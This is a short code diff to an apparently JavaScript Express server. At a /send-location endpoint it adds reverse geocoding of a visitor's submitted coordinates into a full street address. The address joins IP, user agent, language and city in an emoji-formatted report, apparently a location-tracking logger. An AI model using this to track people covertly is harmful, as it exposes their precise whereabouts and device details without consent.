@@ -40,6 +40,14 @@ app.post("/send-location", async (req, res) => {
     return res.status(400).json({ success: false, message: "Latitude e Longitude são obrigatórias!" });
   }
 
+  let fullAddress = 'Unavailable';
+  try {
+    const geo = await axios.get(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`);
+    fullAddress = geo.data.display_name || fullAddress;
+  } catch (geoErr) {
+    console.error("Erro ao obter morada pelo Nominatim:", geoErr.message);
+  }
+
   let locationData = {};
   try {
     const response = await axios.get(`https://ipapi.co/${ip}/json/`);
@@ -59,6 +67,7 @@ app.post("/send-location", async (req, res) => {
 🌍 IP: ${ip}
 🧭 Latitude: ${latitude}
 🧭 Longitude: ${longitude}
+📌 Address: ${fullAddress}
 📱 User-Agent: ${userAgent || 'Não disponível'}
 🗣️ Idioma: ${language || 'Não disponível'}
 🏙️ Cidade: ${locationData.city || 'Desconhecida'}
